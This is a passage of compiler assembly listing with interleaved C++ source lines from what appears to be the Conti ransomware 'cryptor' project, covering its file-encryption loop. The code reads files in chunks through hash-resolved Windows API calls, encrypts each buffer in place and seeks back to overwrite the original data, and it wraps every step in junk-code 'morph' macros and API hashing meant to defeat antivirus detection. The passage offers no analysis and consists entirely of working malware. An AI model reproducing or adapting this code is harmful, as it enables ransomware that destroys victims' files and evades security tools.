  015e8	75 26		 jne	 SHORT $LN1228@EncryptPar
  015ea	66 0f 1f 44 00
	00		 npad	 6
$LL205@EncryptPar:
  015f0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$23[rbp-81]
  015f3	ff c0		 inc	 eax
  015f5	89 45 df	 mov	 DWORD PTR _morph_var$23[rbp-81], eax
  015f8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  015fd	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$23[rbp-81]
  01600	f7 e9		 imul	 ecx
  01602	8b c2		 mov	 eax, edx
  01604	c1 e8 1f	 shr	 eax, 31
  01607	03 d0		 add	 edx, eax
  01609	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0160c	3b c8		 cmp	 ecx, eax
  0160e	74 e0		 je	 SHORT $LL205@EncryptPar
$LN1228@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1100 : 		while (TotalRead < BytesToEncrypt) {

  01610	41 b8 00 00 50
	00		 mov	 r8d, 5242880		; 00500000H
$LN782@EncryptPar:
  01616	4d 85 ff	 test	 r15, r15
  01619	0f 8e ec 05 00
	00		 jle	 $LN4@EncryptPar
  0161f	4c 8b 6d f7	 mov	 r13, QWORD PTR FileInfo$GSCopy$1$[rbp-81]
  01623	4c 8b 65 ff	 mov	 r12, QWORD PTR Buffer$GSCopy$1$[rbp-81]
  01627	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL7@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  01630	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$31[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01637	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0163c	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$31[rbp-81]
  0163f	f7 e9		 imul	 ecx
  01641	8b c2		 mov	 eax, edx
  01643	c1 e8 1f	 shr	 eax, 31
  01646	03 d0		 add	 edx, eax
  01648	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0164b	3b c8		 cmp	 ecx, eax
  0164d	74 40		 je	 SHORT $LN37@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  0164f	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$31[rbp-81]
  01652	83 c1 02	 add	 ecx, 2
  01655	41 03 ce	 add	 ecx, r14d
  01658	89 4d df	 mov	 DWORD PTR _morph_var$31[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0165b	8b 45 df	 mov	 eax, DWORD PTR _morph_var$31[rbp-81]
  0165e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01663	7d 07		 jge	 SHORT $LN1150@EncryptPar
  01665	ff c8		 dec	 eax
  01667	83 c8 fc	 or	 eax, -4
  0166a	ff c0		 inc	 eax
$LN1150@EncryptPar:
  0166c	85 c0		 test	 eax, eax
  0166e	75 70		 jne	 SHORT $LN36@EncryptPar
$LL29@EncryptPar:
  01670	8b 45 df	 mov	 eax, DWORD PTR _morph_var$31[rbp-81]
  01673	ff c0		 inc	 eax
  01675	89 45 df	 mov	 DWORD PTR _morph_var$31[rbp-81], eax
  01678	8b 45 df	 mov	 eax, DWORD PTR _morph_var$31[rbp-81]
  0167b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01680	7d 07		 jge	 SHORT $LN1149@EncryptPar
  01682	ff c8		 dec	 eax
  01684	83 c8 fc	 or	 eax, -4
  01687	ff c0		 inc	 eax
$LN1149@EncryptPar:
  01689	85 c0		 test	 eax, eax
  0168b	74 e3		 je	 SHORT $LL29@EncryptPar

; 51   : 	}

  0168d	eb 51		 jmp	 SHORT $LN36@EncryptPar
$LN37@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  0168f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$31[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01692	b9 02 00 00 00	 mov	 ecx, 2
  01697	8b 45 df	 mov	 eax, DWORD PTR _morph_var$31[rbp-81]
  0169a	41 2b ce	 sub	 ecx, r14d
  0169d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0169f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  016a4	89 4d df	 mov	 DWORD PTR _morph_var$31[rbp-81], ecx
  016a7	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$31[rbp-81]
  016aa	f7 e9		 imul	 ecx
  016ac	8b c2		 mov	 eax, edx
  016ae	c1 e8 1f	 shr	 eax, 31
  016b1	03 d0		 add	 edx, eax
  016b3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  016b6	3b c8		 cmp	 ecx, eax
  016b8	75 26		 jne	 SHORT $LN36@EncryptPar
  016ba	66 0f 1f 44 00
	00		 npad	 6
$LL31@EncryptPar:
  016c0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$31[rbp-81]
  016c3	ff c0		 inc	 eax
  016c5	89 45 df	 mov	 DWORD PTR _morph_var$31[rbp-81], eax
  016c8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  016cd	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$31[rbp-81]
  016d0	f7 e9		 imul	 ecx
  016d2	8b c2		 mov	 eax, edx
  016d4	c1 e8 1f	 shr	 eax, 31
  016d7	03 d0		 add	 edx, eax
  016d9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  016dc	3b c8		 cmp	 ecx, eax
  016de	74 e0		 je	 SHORT $LL31@EncryptPar
$LN36@EncryptPar:

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  016e0	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$29[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  016e7	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  016ec	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$29[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1104 : 			LONGLONG BytesLeft = BytesToEncrypt - TotalRead;

  016ef	49 8b ff	 mov	 rdi, r15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  016f2	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1104 : 			LONGLONG BytesLeft = BytesToEncrypt - TotalRead;

  016f4	49 2b fe	 sub	 rdi, r14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  016f7	8b c2		 mov	 eax, edx
  016f9	c1 e8 1f	 shr	 eax, 31
  016fc	03 d0		 add	 edx, eax
  016fe	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01701	3b c8		 cmp	 ecx, eax
  01703	74 4a		 je	 SHORT $LN81@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  01705	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$29[rbp-81]
  01708	83 c1 02	 add	 ecx, 2
  0170b	03 cf		 add	 ecx, edi
  0170d	89 4d df	 mov	 DWORD PTR _morph_var$29[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  01710	8b 45 df	 mov	 eax, DWORD PTR _morph_var$29[rbp-81]
  01713	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01718	7d 07		 jge	 SHORT $LN1147@EncryptPar
  0171a	ff c8		 dec	 eax
  0171c	83 c8 fc	 or	 eax, -4
  0171f	ff c0		 inc	 eax
$LN1147@EncryptPar:
  01721	85 c0		 test	 eax, eax
  01723	75 7b		 jne	 SHORT $LN80@EncryptPar
  01725	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL73@EncryptPar:
  01730	8b 45 df	 mov	 eax, DWORD PTR _morph_var$29[rbp-81]
  01733	ff c0		 inc	 eax
  01735	89 45 df	 mov	 DWORD PTR _morph_var$29[rbp-81], eax
  01738	8b 45 df	 mov	 eax, DWORD PTR _morph_var$29[rbp-81]
  0173b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01740	7d 07		 jge	 SHORT $LN1146@EncryptPar
  01742	ff c8		 dec	 eax
  01744	83 c8 fc	 or	 eax, -4
  01747	ff c0		 inc	 eax
$LN1146@EncryptPar:
  01749	85 c0		 test	 eax, eax
  0174b	74 e3		 je	 SHORT $LL73@EncryptPar

; 51   : 	}

  0174d	eb 51		 jmp	 SHORT $LN80@EncryptPar
$LN81@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  0174f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$29[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01752	b9 02 00 00 00	 mov	 ecx, 2
  01757	8b 45 df	 mov	 eax, DWORD PTR _morph_var$29[rbp-81]
  0175a	2b cf		 sub	 ecx, edi
  0175c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0175e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01763	89 4d df	 mov	 DWORD PTR _morph_var$29[rbp-81], ecx
  01766	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$29[rbp-81]
  01769	f7 e9		 imul	 ecx
  0176b	8b c2		 mov	 eax, edx
  0176d	c1 e8 1f	 shr	 eax, 31
  01770	03 d0		 add	 edx, eax
  01772	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01775	3b c8		 cmp	 ecx, eax
  01777	75 27		 jne	 SHORT $LN80@EncryptPar
  01779	0f 1f 80 00 00
	00 00		 npad	 7
$LL75@EncryptPar:
  01780	8b 45 df	 mov	 eax, DWORD PTR _morph_var$29[rbp-81]
  01783	ff c0		 inc	 eax
  01785	89 45 df	 mov	 DWORD PTR _morph_var$29[rbp-81], eax
  01788	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0178d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$29[rbp-81]
  01790	f7 e9		 imul	 ecx
  01792	8b c2		 mov	 eax, edx
  01794	c1 e8 1f	 shr	 eax, 31
  01797	03 d0		 add	 edx, eax
  01799	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0179c	3b c8		 cmp	 ecx, eax
  0179e	74 e0		 je	 SHORT $LL75@EncryptPar
$LN80@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1106 : 			BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

  017a0	49 3b f8	 cmp	 rdi, r8
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  017a3	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$30[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  017aa	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$30[rbp-81]
  017ad	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1106 : 			BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

  017b2	41 0f 4f f8	 cmovg	 edi, r8d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  017b6	f7 e9		 imul	 ecx
  017b8	8b c2		 mov	 eax, edx
  017ba	c1 e8 1f	 shr	 eax, 31
  017bd	03 d0		 add	 edx, eax
  017bf	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  017c2	3b c8		 cmp	 ecx, eax
  017c4	74 49		 je	 SHORT $LN60@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  017c6	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$30[rbp-81]
  017c9	83 c1 02	 add	 ecx, 2
  017cc	03 cf		 add	 ecx, edi
  017ce	89 4d df	 mov	 DWORD PTR _morph_var$30[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  017d1	8b 45 df	 mov	 eax, DWORD PTR _morph_var$30[rbp-81]
  017d4	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  017d9	7d 07		 jge	 SHORT $LN1144@EncryptPar
  017db	ff c8		 dec	 eax
  017dd	83 c8 fc	 or	 eax, -4
  017e0	ff c0		 inc	 eax
$LN1144@EncryptPar:
  017e2	85 c0		 test	 eax, eax
  017e4	75 7a		 jne	 SHORT $LN59@EncryptPar
  017e6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL52@EncryptPar:
  017f0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$30[rbp-81]
  017f3	ff c0		 inc	 eax
  017f5	89 45 df	 mov	 DWORD PTR _morph_var$30[rbp-81], eax
  017f8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$30[rbp-81]
  017fb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01800	7d 07		 jge	 SHORT $LN1143@EncryptPar
  01802	ff c8		 dec	 eax
  01804	83 c8 fc	 or	 eax, -4
  01807	ff c0		 inc	 eax
$LN1143@EncryptPar:
  01809	85 c0		 test	 eax, eax
  0180b	74 e3		 je	 SHORT $LL52@EncryptPar

; 51   : 	}

  0180d	eb 51		 jmp	 SHORT $LN59@EncryptPar
$LN60@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  0180f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$30[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01812	b9 02 00 00 00	 mov	 ecx, 2
  01817	8b 45 df	 mov	 eax, DWORD PTR _morph_var$30[rbp-81]
  0181a	2b cf		 sub	 ecx, edi
  0181c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0181e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01823	89 4d df	 mov	 DWORD PTR _morph_var$30[rbp-81], ecx
  01826	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$30[rbp-81]
  01829	f7 e9		 imul	 ecx
  0182b	8b c2		 mov	 eax, edx
  0182d	c1 e8 1f	 shr	 eax, 31
  01830	03 d0		 add	 edx, eax
  01832	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01835	3b c8		 cmp	 ecx, eax
  01837	75 27		 jne	 SHORT $LN59@EncryptPar
  01839	0f 1f 80 00 00
	00 00		 npad	 7
$LL54@EncryptPar:
  01840	8b 45 df	 mov	 eax, DWORD PTR _morph_var$30[rbp-81]
  01843	ff c0		 inc	 eax
  01845	89 45 df	 mov	 DWORD PTR _morph_var$30[rbp-81], eax
  01848	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0184d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$30[rbp-81]
  01850	f7 e9		 imul	 ecx
  01852	8b c2		 mov	 eax, edx
  01854	c1 e8 1f	 shr	 eax, 31
  01857	03 d0		 add	 edx, eax
  01859	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0185c	3b c8		 cmp	 ecx, eax
  0185e	74 e0		 je	 SHORT $LL54@EncryptPar
$LN59@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1110 : 			Success = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);

  01860	49 8b 5d 08	 mov	 rbx, QWORD PTR [r13+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 92   : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x55f5048a, 105);//GetProcAddress(hKernel32, OBFA("ReadFile"));

  01864	ba 0f 00 00 00	 mov	 edx, 15
  01869	41 b8 8a 04 f5
	55		 mov	 r8d, 1442120842		; 55f5048aH
  0186f	44 8d 4a 5a	 lea	 r9d, QWORD PTR [rdx+90]
  01873	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 93   : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);

  01878	4c 8d 4d 07	 lea	 r9, QWORD PTR BytesRead$[rbp-81]
  0187c	48 c7 44 24 20
	00 00 00 00	 mov	 QWORD PTR [rsp+32], 0
  01885	44 8b c7	 mov	 r8d, edi
  01888	49 8b d4	 mov	 rdx, r12
  0188b	48 8b cb	 mov	 rcx, rbx
  0188e	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1111 : 			if (!Success || !BytesRead) {

  01890	85 c0		 test	 eax, eax
  01892	0f 84 67 03 00
	00		 je	 $LN1225@EncryptPar
  01898	83 7d 07 00	 cmp	 DWORD PTR BytesRead$[rbp-81], 0
  0189c	0f 84 5d 03 00
	00		 je	 $LN1225@EncryptPar
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  018a2	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$27[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  018a9	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  018ae	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$27[rbp-81]
  018b1	f7 e9		 imul	 ecx
  018b3	8b c2		 mov	 eax, edx
  018b5	c1 e8 1f	 shr	 eax, 31
  018b8	03 d0		 add	 edx, eax
  018ba	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  018bd	3b c8		 cmp	 ecx, eax
  018bf	74 4e		 je	 SHORT $LN125@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  018c1	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$27[rbp-81]
  018c4	8b 45 07	 mov	 eax, DWORD PTR BytesRead$[rbp-81]
  018c7	83 c0 02	 add	 eax, 2
  018ca	03 c8		 add	 ecx, eax
  018cc	89 4d df	 mov	 DWORD PTR _morph_var$27[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  018cf	8b 45 df	 mov	 eax, DWORD PTR _morph_var$27[rbp-81]
  018d2	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  018d7	7d 07		 jge	 SHORT $LN1141@EncryptPar
  018d9	ff c8		 dec	 eax
  018db	83 c8 fc	 or	 eax, -4
  018de	ff c0		 inc	 eax
$LN1141@EncryptPar:
  018e0	85 c0		 test	 eax, eax
  018e2	75 7c		 jne	 SHORT $LN124@EncryptPar
  018e4	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL117@EncryptPar:
  018f0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$27[rbp-81]
  018f3	ff c0		 inc	 eax
  018f5	89 45 df	 mov	 DWORD PTR _morph_var$27[rbp-81], eax
  018f8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$27[rbp-81]
  018fb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01900	7d 07		 jge	 SHORT $LN1140@EncryptPar
  01902	ff c8		 dec	 eax
  01904	83 c8 fc	 or	 eax, -4
  01907	ff c0		 inc	 eax
$LN1140@EncryptPar:
  01909	85 c0		 test	 eax, eax
  0190b	74 e3		 je	 SHORT $LL117@EncryptPar

; 51   : 	}

  0190d	eb 51		 jmp	 SHORT $LN124@EncryptPar
$LN125@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  0190f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$27[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01912	b9 02 00 00 00	 mov	 ecx, 2
  01917	2b 4d 07	 sub	 ecx, DWORD PTR BytesRead$[rbp-81]
  0191a	8b 45 df	 mov	 eax, DWORD PTR _morph_var$27[rbp-81]
  0191d	03 c1		 add	 eax, ecx
  0191f	89 45 df	 mov	 DWORD PTR _morph_var$27[rbp-81], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  01922	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01927	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$27[rbp-81]
  0192a	f7 e9		 imul	 ecx
  0192c	8b c2		 mov	 eax, edx
  0192e	c1 e8 1f	 shr	 eax, 31
  01931	03 d0		 add	 edx, eax
  01933	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01936	3b c8		 cmp	 ecx, eax
  01938	75 26		 jne	 SHORT $LN124@EncryptPar
  0193a	66 0f 1f 44 00
	00		 npad	 6
$LL119@EncryptPar:
  01940	8b 45 df	 mov	 eax, DWORD PTR _morph_var$27[rbp-81]
  01943	ff c0		 inc	 eax
  01945	89 45 df	 mov	 DWORD PTR _morph_var$27[rbp-81], eax
  01948	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0194d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$27[rbp-81]
  01950	f7 e9		 imul	 ecx
  01952	8b c2		 mov	 eax, edx
  01954	c1 e8 1f	 shr	 eax, 31
  01957	03 d0		 add	 edx, eax
  01959	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0195c	3b c8		 cmp	 ecx, eax
  0195e	74 e0		 je	 SHORT $LL119@EncryptPar
$LN124@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1117 : 			TotalRead += BytesRead;

  01960	8b 75 07	 mov	 esi, DWORD PTR BytesRead$[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  01963	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01968	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$28[rbp-81], 1547201 ; 00179bc1H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1117 : 			TotalRead += BytesRead;

  0196f	4c 03 f6	 add	 r14, rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  01972	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$28[rbp-81]
  01975	f7 e9		 imul	 ecx
  01977	8b c2		 mov	 eax, edx
  01979	c1 e8 1f	 shr	 eax, 31
  0197c	03 d0		 add	 edx, eax
  0197e	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01981	3b c8		 cmp	 ecx, eax
  01983	74 4a		 je	 SHORT $LN104@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  01985	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$28[rbp-81]
  01988	83 c1 02	 add	 ecx, 2
  0198b	41 03 ce	 add	 ecx, r14d
  0198e	89 4d df	 mov	 DWORD PTR _morph_var$28[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  01991	8b 45 df	 mov	 eax, DWORD PTR _morph_var$28[rbp-81]
  01994	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01999	7d 07		 jge	 SHORT $LN1138@EncryptPar
  0199b	ff c8		 dec	 eax
  0199d	83 c8 fc	 or	 eax, -4
  019a0	ff c0		 inc	 eax
$LN1138@EncryptPar:
  019a2	85 c0		 test	 eax, eax
  019a4	75 7a		 jne	 SHORT $LN103@EncryptPar
  019a6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL96@EncryptPar:
  019b0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$28[rbp-81]
  019b3	ff c0		 inc	 eax
  019b5	89 45 df	 mov	 DWORD PTR _morph_var$28[rbp-81], eax
  019b8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$28[rbp-81]
  019bb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  019c0	7d 07		 jge	 SHORT $LN1137@EncryptPar
  019c2	ff c8		 dec	 eax
  019c4	83 c8 fc	 or	 eax, -4
  019c7	ff c0		 inc	 eax
$LN1137@EncryptPar:
  019c9	85 c0		 test	 eax, eax
  019cb	74 e3		 je	 SHORT $LL96@EncryptPar

; 51   : 	}

  019cd	eb 51		 jmp	 SHORT $LN103@EncryptPar
$LN104@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  019cf	8b 45 df	 mov	 eax, DWORD PTR _morph_var$28[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  019d2	b9 02 00 00 00	 mov	 ecx, 2
  019d7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$28[rbp-81]
  019da	41 2b ce	 sub	 ecx, r14d
  019dd	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  019df	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  019e4	89 4d df	 mov	 DWORD PTR _morph_var$28[rbp-81], ecx
  019e7	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$28[rbp-81]
  019ea	f7 e9		 imul	 ecx
  019ec	8b c2		 mov	 eax, edx
  019ee	c1 e8 1f	 shr	 eax, 31
  019f1	03 d0		 add	 edx, eax
  019f3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  019f6	3b c8		 cmp	 ecx, eax
  019f8	75 26		 jne	 SHORT $LN103@EncryptPar
  019fa	66 0f 1f 44 00
	00		 npad	 6
$LL98@EncryptPar:
  01a00	8b 45 df	 mov	 eax, DWORD PTR _morph_var$28[rbp-81]
  01a03	ff c0		 inc	 eax
  01a05	89 45 df	 mov	 DWORD PTR _morph_var$28[rbp-81], eax
  01a08	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01a0d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$28[rbp-81]
  01a10	f7 e9		 imul	 ecx
  01a12	8b c2		 mov	 eax, edx
  01a14	c1 e8 1f	 shr	 eax, 31
  01a17	03 d0		 add	 edx, eax
  01a19	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01a1c	3b c8		 cmp	 ecx, eax
  01a1e	74 e0		 je	 SHORT $LL98@EncryptPar
$LN103@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1123 : 			ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);

  01a20	44 8b 4d 07	 mov	 r9d, DWORD PTR BytesRead$[rbp-81]
  01a24	49 8d 4d 18	 lea	 rcx, QWORD PTR [r13+24]
  01a28	4d 8b c4	 mov	 r8, r12
  01a2b	49 8b d4	 mov	 rdx, r12
  01a2e	e8 00 00 00 00	 call	 ECRYPT_encrypt_bytes

; 1125 : 			Offset.QuadPart = -((LONGLONG)BytesRead);

  01a33	8b 5d 07	 mov	 ebx, DWORD PTR BytesRead$[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  01a36	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1126 : 			if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {

  01a3b	49 8b 7d 08	 mov	 rdi, QWORD PTR [r13+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  01a3f	41 b8 a7 1b e5
	d6		 mov	 r8d, -689628249		; d6e51ba7H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1125 : 			Offset.QuadPart = -((LONGLONG)BytesRead);

  01a45	48 f7 db	 neg	 rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  01a48	44 8d 4a 4a	 lea	 r9d, QWORD PTR [rdx+74]
  01a4c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 250  : 	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);

  01a51	41 b9 01 00 00
	00		 mov	 r9d, 1
  01a57	45 33 c0	 xor	 r8d, r8d
  01a5a	48 8b d3	 mov	 rdx, rbx
  01a5d	48 8b cf	 mov	 rcx, rdi
  01a60	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

